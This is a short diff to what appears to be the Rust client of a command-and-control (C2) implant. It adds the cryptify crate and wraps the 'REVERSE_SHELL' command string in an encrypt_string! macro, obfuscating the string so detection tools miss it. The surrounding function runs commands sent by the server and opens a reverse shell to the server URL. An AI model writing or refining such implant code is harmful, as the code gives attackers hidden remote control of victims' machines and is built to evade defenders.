@@ -1,3 +1,4 @@
+use cryptify::encrypt_string;
 use reqwest::Client;
 use std::process::Stdio;
 use tokio::io::{AsyncBufReadExt, BufReader};
@@ -14,7 +15,7 @@ pub async fn execute_command(
 ) -> C2Result<()> {
     println!("Executing command: {}", cmd.command);
 
-    if cmd.command == "REVERSE_SHELL" {
+    if cmd.command == encrypt_string!("REVERSE_SHELL") {
         if let Some(session_id) = cmd.args.first() {
             return start_reverse_shell(http_client, server_url, session_id.clone().to_string())
                 .await;
